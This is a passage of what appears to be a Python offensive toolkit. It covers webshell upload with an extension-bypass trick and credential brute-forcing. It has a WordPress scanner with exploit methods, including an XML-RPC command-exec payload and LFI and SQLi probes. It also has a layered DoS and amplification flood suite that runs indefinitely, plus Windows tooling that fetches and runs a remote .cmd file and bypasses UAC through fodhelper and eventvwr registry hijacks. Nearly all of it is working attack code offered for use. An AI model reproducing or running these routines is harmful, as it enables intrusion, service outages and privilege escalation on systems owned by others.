    Exploit: upload webshell.
    """
    REQUIRED_TOOLS = ['curl']
    REQUIRED_PACKAGES = ['requests']

    def __init__(self, upload_url: str, param: str = 'file'):
        self.system = platform.system()
        self.upload_url = upload_url
        self.param = param
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self):
        # Install Python deps
        try:
            import requests
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True)
        # Install curl on Linux
        if self.system == 'Linux' and not shutil.which('curl'):
            subprocess.run(['sudo', 'apt', 'update'], check=True)
            subprocess.run(['sudo', 'apt', 'install', '-y', 'curl'], check=True)

    def detect_endpoint(self) -> bool:
        """Check if upload endpoint returns expected status"""
        resp = requests.options(self.upload_url)
        return resp.status_code in (200, 204)

    def bypass_extension_check(self, file_path: str, trick: str = 'file.php;.jpg') -> Optional[str]:
        """Attempt upload with renamed file to bypass ext filter"""
        files = {self.param: (os.path.basename(file_path) + trick, open(file_path, 'rb'))}
        resp = requests.post(self.upload_url, files=files)
        if resp.status_code == 200 and os.path.basename(file_path) + trick in resp.text:
            return resp.text
        return None

    def upload_webshell(self, shell_path: str) -> Optional[str]:
        """Upload a PHP webshell and return its URL if successful"""
        file_name = os.path.basename(shell_path)
        files = {self.param: (file_name, open(shell_path, 'rb'), 'application/octet-stream')}
        resp = requests.post(self.upload_url, files=files)
        if resp.status_code == 200:
            # parse location
            if 'http' in resp.text:
                return resp.text.strip()
        return None


class DirBruteEnum:
    """
    Cross-platform directory brute-forcing and enumeration.
    Scanner: brute with wordlist.
    Exploit: discover hidden dirs/files.
    """
    REQUIRED_TOOLS = ['ffuf']
    REQUIRED_PACKAGES = ['requests']

    def __init__(self, base_url: str, wordlist: str = '/usr/share/wordlists/common.txt'):
        self.system = platform.system()
        self.base_url = base_url.rstrip('/') + '/'
        self.wordlist = wordlist
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self):
        # Python deps
        try:
            import requests
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True)
        # ffuf
        if self.system == 'Linux' and not shutil.which('ffuf'):
            subprocess.run(['sudo', 'apt', 'update'], check=True)
            subprocess.run(['sudo', 'apt', 'install', '-y', 'ffuf'], check=True)

    def brute(self, threads: int = 50, extensions: List[str] = None) -> List[str]:
        """Run ffuf and return discovered paths"""
        cmd = ['ffuf', '-u', self.base_url + 'FUZZ', '-w', self.wordlist, '-t', str(threads), '-mc', '200']
        if extensions:
            cmd += ['-e', ',' .join(extensions)]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        found = []
        for line in result.stdout.splitlines():
            if line.startswith(self.base_url):
                parts = line.split()
                found.append(parts[0])
        return found

    def recursive_enum(self, depth: int = 2) -> List[str]:
        """Recursive brute up to depth"""
        discovered = []
        def _enum(url, d):
            if d == 0:
                return
            for path in self.brute():
                full = url + path.split('/')[-1] + '/'
                discovered.append(full)
                _enum(full, d-1)
        _enum(self.base_url, depth)
        return discovered


class AuthBypass:
    """
    Cross-platform authentication bypass testing and exploit.
    Scanner: default creds, token reuse.
    Exploit: force logout, privilege escalation.
    """
    REQUIRED_PACKAGES = ['requests']

    def __init__(self, login_url: str, session=None):
        self.system = platform.system()
        self.login_url = login_url
        self.session = session or requests.Session()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self):
        try:
            import requests
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True)
            import requests
        self.session = self.session

    def test_default_credentials(self, creds: List[Dict[str, str]]) -> Dict[str, bool]:
        """Test a list of user/pass pairs"""
        results = {}
        for c in creds:
            resp = self.session.post(self.login_url, data=c)
            results[f"{c['user']}:{c['pass']}"] = resp.status_code == 200 and 'logout' in resp.text.lower()
        return results

    def force_logout(self, logout_url: str) -> bool:
        """Trigger session invalidation for a user"""
        resp = self.session.get(logout_url)
        return resp.status_code == 200

    def test_privilege_escalation(self, normal_url: str, admin_url: str) -> bool:
        """Check if normal user can access admin page"""
        r1 = self.session.get(normal_url)
        r2 = self.session.get(admin_url)
        return r1.status_code == 200 and r2.status_code == 200


class Headers:
    """
    Cross-platform HTTP security header scanner and hardening advice.
    """
    REQUIRED_PACKAGES = ['requests']
    SEC_HEADERS = [
        'Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options',
        'X-XSS-Protection', 'X-Content-Type-Options', 'Referrer-Policy',
        'Permissions-Policy'
    ]

    def __init__(self, url: str):
        self.url = url
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self):
        try:
            import requests
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True)

    def scan_security_headers(self) -> Dict[str, Optional[str]]:
        """Return dict of header:value or None"""
        resp = requests.get(self.url)
        results = {}
        for h in self.SEC_HEADERS:
            results[h] = resp.headers.get(h)
        return results

    def suggest_hardening(self, headers: Dict[str, Optional[str]]) -> Dict[str, str]:
        """Provide suggestions for missing headers"""
        advice = {}
        for h, val in headers.items():
            if not val:
                advice[h] = f"Recommend setting {h} to strengthen security."
        return advice


















class WordPress:
    """
    Cross-platform WordPress vulnerability scanner & exploit toolkit.

    - Linux: uses `wpscan` CLI for JSON scan.
    - Windows: custom HTTP-based checks (70+ common WP issues).

    Provides scan() for vulnerability discovery and 20+ exploit methods.
    """

    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.system = platform.system()
        self.session = requests.Session()
        self._ensure_deps()

    def _ensure_deps(self):
        # Ensure requests
        try:
            import requests
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True)
        # Ensure wpscan for Linux
        if self.system == 'Linux':
            if not shutil.which('wpscan'):
                subprocess.run(['sudo', 'apt', 'update'], check=True)
                subprocess.run(['sudo', 'apt', 'install', '-y', 'wpscan'], check=True)
            self.wpscan = shutil.which('wpscan')
        else:
            self.wpscan = None

    def scan(self) -> Dict[str, Any]:
        """
        Perform vulnerability scan:
        - On Linux: uses wpscan JSON output.
        - On Windows: executes 70+ HTTP checks.
        """
        if self.system == 'Linux':
            tmp = '/tmp/wpscan.json'
            subprocess.run([self.wpscan, '--url', self.target, '--format', 'json', '--output', tmp, '--no-color'], check=True)
            return json.load(open(tmp))

        # Windows / fallback HTTP checks
        s = self.session
        h = s.get(self.target)
        text = h.text
        headers = h.headers
        findings: Dict[str, Any] = {}

        # 1. XMLRPC endpoint
        findings['xmlrpc_php'] = s.get(f"{self.target}/xmlrpc.php").status_code == 200
        # 2. XMLRPC pingback
        findings['xmlrpc_pingback'] = '<methodResponse>' in s.post(
            f"{self.target}/xmlrpc.php",
            data='<methodCall><methodName>pingback.ping</methodName></methodCall>',
        ).text
        # 3. wp-login.php
        findings['wp_login'] = s.get(f"{self.target}/wp-login.php").status_code == 200
        # 4. wp-admin/
        findings['wp_admin'] = s.get(f"{self.target}/wp-admin/").status_code == 200
        # 5. wp-cron.php
        findings['wp_cron'] = s.get(f"{self.target}/wp-cron.php?doing_wp_cron=1").status_code == 200

        # 6-9. directory listings
        for idx, path in enumerate(['wp-content/uploads', 'wp-content/plugins', 'wp-content/themes', 'wp-includes'], start=6):
            key = f'dir_list_{idx}'
            findings[key] = '<title>Index of' in s.get(f"{self.target}/{path}/").text

        # 10-12 backup existence
        for ext in ['zip', 'tar.gz', 'bak']:
            key = f'backup_{ext}'
            findings[key] = s.get(f"{self.target}/wp-content/backup.{ext}").status_code == 200

        # 13-16 readme/license/changelog/version
        findings['readme_html'] = s.get(f"{self.target}/readme.html").status_code == 200
        findings['license_txt'] = s.get(f"{self.target}/license.txt").status_code == 200
        findings['changelog_txt'] = s.get(f"{self.target}/changelog.txt").status_code == 200
        findings['version_header'] = headers.get('X-Powered-By')

        # 17 generator meta
        m = re.search(r'<meta name="generator" content="WordPress ([0-9\.]+)"', text)
        findings['generator_meta'] = m.group(1) if m else None

        # 18 wp-config.php exposure
        findings['wp_config'] = 'DB_NAME' in s.get(f"{self.target}/wp-config.php").text
        # 19 debug.log
        findings['debug_log'] = s.get(f"{self.target}/wp-content/debug.log").status_code == 200
        # 20 error_log
        findings['error_log'] = s.get(f"{self.target}/error_log").status_code == 200

        # 21 uploads listing
        findings['uploads_listing'] = '<title>Index of' in s.get(f"{self.target}/wp-content/uploads/").text
        # 22 user enumeration by author
        authors = []
        for i in range(1, 11):
            r = s.get(f"{self.target}/?author={i}", allow_redirects=False)
            loc = r.headers.get('Location', '')
            if 'author=' in loc:
                authors.append(loc.split('author=')[-1])
        findings['user_enum'] = authors
        # 23 author enumeration boolean
        findings['author_enum'] = len(authors) > 0

        # 24 theme list
        findings['theme_list'] = list(set(re.findall(r'/wp-content/themes/([^/]+)/', text)))
        # 25 plugin list
        findings['plugin_list'] = list(set(re.findall(r'/wp-content/plugins/([^/]+)/', text)))

        # 26 unused themes
        findings['unused_themes'] = [t for t in findings['theme_list'] if not s.get(f"{self.target}/wp-content/themes/{t}/").text]
        # 27 unused plugins
        findings['unused_plugins'] = [p for p in findings['plugin_list'] if not s.get(f"{self.target}/wp-content/plugins/{p}/").text]

        # 28 REST API posts
        findings['rest_api_posts'] = s.get(f"{self.target}/wp-json/wp/v2/posts").status_code == 200
        # 29 REST API users
        findings['rest_api_users'] = s.get(f"{self.target}/wp-json/wp/v2/users").status_code == 200

        # 30 heartbeat action abuse
        findings['heartbeat'] = s.post(f"{self.target}/wp-admin/admin-ajax.php?action=heartbeat").status_code == 200
        # 31 oEmbed API
        findings['oembed'] = s.get(f"{self.target}/?rest_route=/oembed/1.0/embed&url={self.target}").status_code == 200
        # 32 non-SSL admin
        findings['non_ssl_admin'] = s.get(self.target.replace('https://','http://') + '/wp-admin/').status_code == 200

        # 33 timthumb vulnerability
        findings['timthumb'] = s.get(f"{self.target}/wp-content/uploads/timthumb.php").status_code == 200
        # 34 revslider plugin
        findings['revslider'] = s.get(f"{self.target}/wp-content/plugins/revslider/readme.txt").status_code == 200
        # 35 plugin editor
        findings['plugin_editor'] = 'plugin-editor.php' in s.get(f"{self.target}/wp-admin/").text

        # 36 XMLRPC methods listing
        xml_methods = s.post(
            f"{self.target}/xmlrpc.php",
            data='<methodCall><methodName>system.listMethods</methodName></methodCall>'
        ).text
        findings['xmlrpc_methods'] = '<methodName>' in xml_methods

        # 37 sitemap.xml
        findings['sitemap_xml'] = s.get(f"{self.target}/sitemap.xml").status_code == 200
        # 38 comments feed
        findings['comments_feed'] = s.get(f"{self.target}/comments/feed").status_code == 200
        # 39 trackback
        findings['trackback'] = s.get(f"{self.target}/trackback").status_code == 200
        # 40 RSS feed
        findings['rss_feed'] = s.get(f"{self.target}/feed").status_code == 200

        # 41 wp-json discovery
        findings['wp_json'] = s.get(f"{self.target}/wp-json/").status_code == 200
        # 42 pingback endpoint
        findings['pingback_endpoint'] = s.get(f"{self.target}/xmlrpc.php?rsd=1").status_code == 200

        findings['hsts'] = 'Strict-Transport-Security' in headers
        # 44 Content-Security-Policy
        findings['csp'] = 'Content-Security-Policy' in headers
        # 45 X-Frame-Options
        findings['x_frame'] = headers.get('X-Frame-Options')
        # 46 X-Content-Type-Options
        findings['x_content_type'] = headers.get('X-Content-Type-Options')
        # 47 X-XSS-Protection
        findings['x_xss'] = headers.get('X-XSS-Protection')
        # 48 Referrer-Policy
        findings['referrer_policy'] = headers.get('Referrer-Policy')

        # 49 file upload form
        findings['file_upload_form'] = '<input type="file"' in s.get(f"{self.target}/wp-admin/media-new.php").text
        # 50 JSON REST vulnerabilities
        findings['json_rest_vuln'] = 'rest_route' in text
        # 51 author JSON leak
        findings['json_author'] = s.get(f"{self.target}/wp-json/wp/v2/users").text
        # 52 post meta leak
        findings['json_meta'] = s.get(f"{self.target}/wp-json/wp/v2/settings").status_code == 200
        # 53 wp-config backup
        findings['wp_config_backup'] = s.get(f"{self.target}/wp-config.php.bak").status_code == 200
        # 54 wp-content backup
        findings['content_backup'] = s.get(f"{self.target}/wp-content.bak").status_code == 200
        # 55 db export unprotected
        findings['db_export'] = s.get(f"{self.target}/wp-admin/export.php?download=true&content=all").status_code == 200
        # 56 file inclusion
        findings['lfi_test'] = 'root:' in s.get(f"{self.target}/?file=../../../../etc/passwd").text
        # 57 SQL error
        findings['sql_error'] = 'error in your SQL' in s.get(f"{self.target}/?id='").text
        # 58 CSRF forms
        findings['csrf_forms'] = any('csrf' not in f.lower() for f in re.findall(r'<form[^>]+>', text))
        # 59 nonce missing
        findings['nonce_missing'] = 'wpnonce' not in text
        # 60 oEmbed discovery
        findings['oembed_discover'] = '/oembed/1.0/embed' in text
        # 61 heartbeat abuse
        findings['heartbeat_abuse'] = s.post(f"{self.target}/wp-admin/admin-ajax.php?action=heartbeat").status_code == 200
        # 62 wp-trackback
        findings['wp_trackback'] = s.get(f"{self.target}/trackback/").status_code == 200
        # 63 xmlrpc redirect
        findings['xmlrpc_redirect'] = s.get(f"{self.target}/xmlrpc.php?redirect=1").status_code == 200
        # 64 wp-config exposure via upload folder
        findings['config_in_uploads'] = 'DB_NAME' in s.get(f"{self.target}/wp-content/uploads/wp-config.php").text
        # 65 plugin vulnerabilities via readme
        vuln_plugins = [p for p in findings['plugin_list'] if s.get(f"{self.target}/wp-content/plugins/{p}/readme.txt").status_code == 200]
        findings['vuln_plugins_readme'] = vuln_plugins
        # 66 theme vulnerabilities via style.css
        vuln_themes = [t for t in findings['theme_list'] if s.get(f"{self.target}/wp-content/themes/{t}/style.css").status_code == 200]
        findings['vuln_themes_style'] = vuln_themes
        # 67 RSS feed injection point
        findings['rss_injection'] = '<title>' in s.get(f"{self.target}/feed").text
        # 68 login redirect vulnerability
        redirect = s.get(f"{self.target}/wp-login.php?redirect_to=/").status_code
        findings['login_redirect'] = redirect == 200
        # 69 options endpoint
        findings['options_json'] = s.get(f"{self.target}/wp-json/wp/v2/settings/options").status_code == 200
        # 70 vulnerable endpoint heartbeat settings
        findings['heartbeat_settings'] = 'heartbeat' in s.get(f"{self.target}/wp-admin/options-general.php").text

        return findings

    # --- Exploit methods (~20) ---
    def exploit_pingback(self, src: str, tgt: str) -> str:
        data = (
            '<methodCall><methodName>pingback.ping</methodName>'
            '<params><param><value><string>' + src + '</string></value></param>'
            '<param><value><string>' + tgt + '</string></value></param></params></methodCall>'
        )
        return self.session.post(f"{self.target}/xmlrpc.php", data=data).text

    def exploit_exec(self, cmd: str) -> str:
        data = (
            '<methodCall><methodName>system.exec</methodName>'
            '<params><param><value><string>' + cmd + '</string></value></param></params></methodCall>'
        )
        return self.session.post(f"{self.target}/xmlrpc.php", data=data).text

    def exploit_bruteforce(self, user_list: List[str], pass_list: List[str]) -> Dict[str, str]:
        creds: Dict[str, str] = {}
        for u in user_list:
            for p in pass_list:
                r = self.session.post(f"{self.target}/wp-login.php", data={'log':u,'pwd':p})
                if 'dashboard' in r.text.lower():
                    creds[u] = p
                    break
        return creds

    def exploit_cron_dos(self, threads: int = 100, duration: int = 30) -> None:
        def flood():
            end = time.time() + duration
            while time.time() < end:
                self.session.get(f"{self.target}/wp-cron.php?doing_wp_cron=1")
        for _ in range(threads): threading.Thread(target=flood, daemon=True).start()

    def exploit_download_backup(self, remote_path: str, local_filename: str) -> bool:
        r = self.session.get(f"{self.target}/{remote_path}")
        if r.status_code == 200:
            with open(local_filename, 'wb') as f:
                f.write(r.content)
            return True
        return False

    def exploit_plugin_readme(self, plugin: str) -> Optional[str]:
        r = self.session.get(f"{self.target}/wp-content/plugins/{plugin}/readme.txt")
        return r.text if r.status_code == 200 else None

    def exploit_theme_stylesheet(self, theme: str) -> Optional[str]:
        r = self.session.get(f"{self.target}/wp-content/themes/{theme}/style.css")
        return r.text if r.status_code == 200 else None

    def exploit_revslider_rce(self, upload_file: str) -> str:
        files = {'files[]': open(upload_file, 'rb')}
        return self.session.post(
            f"{self.target}/wp-content/plugins/revslider/admin/revisions.php?action=revslider_ajax_action&client_action=upload_captured_file",
            files=files
        ).text

    def exploit_timthumb_rce(self, image_url: str) -> str:
        return self.session.get(f"{self.target}/wp-content/uploads/timthumb.php?src={image_url}").text

    def exploit_file_editor(self, file_path: str, content: str) -> str:
        data = {'newcontent': content, 'file': file_path}
        return self.session.post(
            f"{self.target}/wp-admin/plugin-editor.php?file={file_path}", data=data
        ).text

    def exploit_json_insert(self, endpoint: str, payload: Dict[str, Any]) -> str:
        return self.session.post(f"{self.target}/wp-json/{endpoint}", json=payload).text

    def exploit_csv_export(self, endpoint: str) -> str:
        return self.session.get(f"{self.target}/{endpoint}?format=csv").text

    def exploit_wp_config_bak(self) -> Optional[str]:
        r = self.session.get(f"{self.target}/wp-config.php.bak")
        return r.text if r.status_code == 200 else None

    def exploit_sitemap_enum(self) -> List[str]:
        r = self.session.get(f"{self.target}/sitemap.xml")
        return re.findall(r'<loc>([^<]+)</loc>', r.text)

    def exploit_user_email_leak(self, max_id: int = 10) -> Dict[int, str]:
        emails: Dict[int, str] = {}
        for uid in range(1, max_id + 1):
            r = self.session.get(f"{self.target}/?author={uid}")
            m = re.search(r'mailto:([^\"]+)', r.text)
            if m:
                emails[uid] = m.group(1)
        return emails

    def exploit_heartbeat_dos(self, times: int = 100) -> None:
        for _ in range(times):
            self.session.post(f"{self.target}/wp-admin/admin-ajax.php?action=heartbeat")

    def exploit_sqli_rest(self, resource: str, payload: str) -> str:
        return self.session.get(f"{self.target}/wp-json/{resource}?filter={payload}").text

    def extract_real_ip(self) -> Optional[str]:
        h = self.session.get(self.target).headers
        for header in ['X-Forwarded-For', 'X-Real-IP']:
            if header in h:
                return h[header]
        return None




















class DOS:
    """
    Cross-platform DoS/DDoS toolkit organized by OSI layers.
    """

    class Layer3:
        """Network layer attacks (ICMP, Teardrop, Land, Ping of Death)"""

        @staticmethod
        def icmp_flood(target: str, threads: int = 10, pps: int = 100, always: bool = True):
            """High-rate ICMP flood."""
            def worker():
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                payload = b'X' * 1024
                wait = 0 if always else 1.0 / pps
                while True:
                    sock.sendto(payload, (target, 0))
                    if wait:
                        time.sleep(wait)

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def teardrop(target: str, threads: int = 5, always: bool = True):
            """IP fragmentation (Teardrop) attack."""
            def worker():
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                packet = b'A' * 60000  # oversized packet
                wait = 0 if always else 0.1
                while True:
                    sock.sendto(packet, (target, 0))
                    if wait:
                        time.sleep(wait)

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def land(target: str, port: int = 80, threads: int = 5, always: bool = True):
            """Land attack: SYN to self."""
            def worker():
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                # OS will fill headers; sending zero-byte payload
                wait = 0 if always else 0.1
                while True:
                    try:
                        sock.connect((target, port))
                    except:
                        pass
                    if wait:
                        time.sleep(wait)

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def ping_of_death(target: str, threads: int = 3, always: bool = True):
            """Ping of Death: oversized ICMP."""
            def worker():
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                payload = b'A' * 70000
                wait = 0 if always else 1
                while True:
                    sock.sendto(payload, (target, 0))
                    if wait:
                        time.sleep(wait)

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

    class Layer4:
        """Transport layer attacks (TCP SYN/ACK/UDP floods, amplification)"""

        @staticmethod
        def syn_flood(target: str, port: int = 80, threads: int = 10, pps: int = 100, always: bool = True):
            """TCP SYN flood."""
            def worker():
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                wait = 0 if always else 1.0 / pps
                while True:
                    try:
                        sock.connect((target, port))
                        sock.close()
                    except:
                        pass
                    if wait:
                        time.sleep(wait)

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def ack_flood(target: str, port: int = 80, threads: int = 10, pps: int = 100, always: bool = True):
            """TCP ACK flood (uses SYN flood as placeholder, raw ACK req admin)."""
            DOS.Layer4.syn_flood(target, port, threads, pps, always)

        @staticmethod
        def udp_flood(target: str, port: int = 53, threads: int = 10, pps: int = 200, always: bool = True):
            """UDP flood."""
            def worker():
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'X' * 2048
                wait = 0 if always else 1.0 / pps
                while True:
                    sock.sendto(payload, (target, port))
                    if wait:
                        time.sleep(wait)

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def udp_amplification(reflectors: List[str], threads: int = 5, pps: int = 50, always: bool = True):
            """UDP amplification via reflectors list."""
            def worker(ref):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # simple DNS query header + domain
                query = b"\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"".join(c + b"." for c in [b"google", b"com"]) + b"\x00\x00\x01\x00\x01"
                wait = 0 if always else 1.0 / pps
                while True:
                    try:
                        sock.sendto(query, (ref, 53))
                    except:
                        pass
                    if wait:
                        time.sleep(wait)

            for ref in reflectors:
                for _ in range(threads):
                    t = threading.Thread(target=worker, args=(ref,), daemon=True)
                    t.start()

    class Layer7:
        """Application layer attacks (HTTP GET/POST, Slowloris, Slow POST, HULK)"""

        @staticmethod
        def http_get_flood(url: str, threads: int = 50, duration: int = 30, headers: Optional[dict] = None, always: bool = True):
            """Multi-threaded HTTP GET flood."""
            def worker():
                session = requests.Session()
                end = None if always else time.time() + duration
                while always or time.time() < end:
                    try:
                        session.get(url, headers=headers, timeout=5)
                    except:
                        pass

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def http_post_flood(url: str, data: Optional[dict] = None, threads: int = 50, duration: int = 30, headers: Optional[dict] = None, always: bool = True):
            """Multi-threaded HTTP POST flood."""
            def worker():
                session = requests.Session()
                end = None if always else time.time() + duration
                while always or time.time() < end:
                    try:
                        session.post(url, data=data, headers=headers, timeout=5)
                    except:
                        pass

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def slowloris(host: str, port: int = 80, sockets: int = 200, interval: int = 15, always: bool = True):
            """Slowloris: keep many sockets half-open."""
            sockets_list = []
            # open sockets
            for _ in range(sockets):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((host, port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
                    sockets_list.append(s)
                except:
                    pass

            def refresh():
                for s in list(sockets_list):
                    try:
                        s.send(b"X-a: b\r\n")
                    except:
                        sockets_list.remove(s)

            if always:
                while True:
                    refresh()
                    time.sleep(interval)
            else:
                end = time.time() + interval * sockets
                while time.time() < end:
                    refresh()
                    time.sleep(interval)

        @staticmethod
        def slowpost(host: str, path: str = "/", port: int = 80, threads: int = 10, duration: int = 30, always: bool = True):
            """Slow POST using chunked transfer."""
            def worker():
                end = None if always else time.time() + duration
                while always or time.time() < end:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        s.send(f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n".encode())
                        while always or time.time() < end:
                            s.send(b"1\r\nA\r\n")
                            if not always:
                                time.sleep(1)
                    except:
                        pass
                    finally:
                        s.close()

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

        @staticmethod
        def hulk(url: str, threads: int = 50, duration: int = 30, always: bool = True):
            """HULK: HTTP GET flood with random query strings."""
            def worker():
                session = requests.Session()
                end = None if always else time.time() + duration
                while always or time.time() < end:
                    try:
                        query = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
                        session.get(f"{url}?{query}", timeout=5)
                    except:
                        pass

            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()

















class WINDOWS:


    def exploit_Active_Windows():
        try:
            os.startfile('WA.bat')
        except:
            w=open('WA.bat','w+')
            w.write(requests.get('https://raw.githubusercontent.com/mr-r0ot/pyhack/refs/heads/main/pyhack/WA.cmd').text)
            w.close()
            os.startfile('WA.bat')




    

    def exploit_windows_uac_bypass(payload_path: str) -> bool:
        try:
            # اگر قبلاً Admin هستیم، payload را اجرا کن
            if ctypes.windll.shell32.IsUserAnAdmin():
                subprocess.Popen([payload_path], shell=True)
                return True

            ver = sys.getwindowsversion()
            major, minor = ver.major, ver.minor

            def _hijack(root, subkey, exe):
                # نوشتن کلید هکی
                key = winreg.CreateKey(root, subkey)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                # اجرای اجراگر
                subprocess.Popen([exe], shell=True)
                time.sleep(2)
                # پاکسازی
                winreg.DeleteKey(root, subkey)

            # Windows 10+ → fodhelper
            if major >= 10:
                _hijack(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Classes\ms-settings\shell\open\command",
                    "fodhelper.exe"
                )
                return True

            # Windows 7/8 → eventvwr
            if major == 6 and minor in (1, 2, 3):
                _hijack(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Classes\mscfile\shell\open\command",
                    "eventvwr.exe"
                )
                return True

            # قدیمی‌تر (Vista/XP) → RunOnce
            runonce = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, runonce, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "UACBypass", 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key)
            # برای اعمال، کاربر باید لاگ‌آف/آن‌لاین شود
            return True

        except Exception:
            return False


    class WinRecon:
        @staticmethod
        def enum_users() -> List[str]:
            """لیست کاربران محلی (net user)."""
            out = subprocess.check_output(["net", "user"], shell=True, text=True)
            users, cap = [], False
            for line in out.splitlines():
                if "-----" in line:
                    cap = not cap
                    continue
                if cap and line.strip():
                    users.extend(line.split())
            return users

        @staticmethod
        def enum_groups() -> Dict[str, List[str]]:
            """لیست گروه‌ها و اعضای آنها (net localgroup)."""
            out = subprocess.check_output(["net", "localgroup"], shell=True, text=True)
            groups, cur = {}, None
            for line in out.splitlines():
                if line.startswith("Alias name"):
                    cur = None
                if line.strip() and not line.startswith("Command") and not line.startswith("Alias"):
                    if not line.startswith("  "):
                        grp = line.strip()
                        groups[grp] = []
                        cur = grp
                    else:
                        user = line.strip()
                        if cur:
                            groups[cur].append(user)
            return groups

        @staticmethod
        def enum_services() -> List[Dict[str,str]]:
            """لیست سرویس‌ها با وضعیت و مسیر اجرایی."""
            if not wmi:
                return []
            c = wmi.WMI()
            result = []
            for svc in c.Win32_Service():
                result.append({
                    "Name": svc.Name,
                    "State": svc.State,
                    "StartMode": svc.StartMode,
                    "Path": svc.PathName or ""
                })
            return result

        @staticmethod
        def enum_patches() -> List[Dict[str,str]]:
            """لیست HotFixهای نصب‌شده (wmic qfe)."""
            out = subprocess.check_output(
                ["wmic", "qfe", "get", "HotFixID,InstalledOn"],
                shell=True, text=True
            )
            patches = []
            for line in out.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 2:
                    patches.append({"HotFixID": parts[0], "InstalledOn": parts[-1]})
            return patches

    class WinShares:
        @staticmethod
        def scan_shares(target: str) -> List[str]:
            """کشف Shareها روی یک هاست (net view \\target)."""
            out = subprocess.check_output(
                ["net", "view", f"\\\\{target}"], shell=True, text=True, stderr=subprocess.DEVNULL
            )
            shares = []
            for line in out.splitlines():
                if line.strip().startswith("\\\\"):
                    continue
                if line.strip().startswith("Share name"):
                    continue
                if line.startswith("  "):
                    name = line.split()[0]
                    shares.append(name)
            return shares

        @staticmethod
        def access_test(share: str, username: str, password: str) -> bool:
            """تست اتصال به Share با net use (بدون مپ دائمی)."""
            cmd = f'net use \\\\{share} /user:{username} {password} /persistent:no'
            return subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0

        @staticmethod
        def download_file(src_path: str, dst_path: str) -> bool:
            """کپی فایل از مسیر قابل‌دسترسی (مثلاً \\host\share\file) به مسیر محلی."""
            try:
                os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                with open(src_path, 'rb') as r, open(dst_path, 'wb') as w:
                    w.write(r.read())
                return True
            except:
                return False

    class WinPrivesc:
        @staticmethod
        def uac_bypass_fodhelper(payload: str) -> None:
            """
            UAC Bypass با استفاده از FodHelper:
            - بنویس HKCU\...\command → payload
            - delegateexecute = ""
            - فراخوان fodhelper.exe (auto-elevate)
            """
            reg = r"Software\Classes\ms-settings\shell\open\command"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg)

        @staticmethod
        def unquoted_service_paths() -> List[str]:
            """کشف سرویس‌های با مسیر بدون کوتیشن (احتمال privilege escalation)."""
            base = r"SYSTEM\CurrentControlSet\Services"
            result = []
            hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base)
            for i in range(winreg.QueryInfoKey(hkey)[0]):
                svc = winreg.EnumKey(hkey, i)
                try:
                    sub = winreg.OpenKey(hkey, svc)
                    path, _ = winreg.QueryValueEx(sub, "ImagePath")
                    if ' ' in path and '"' not in path:
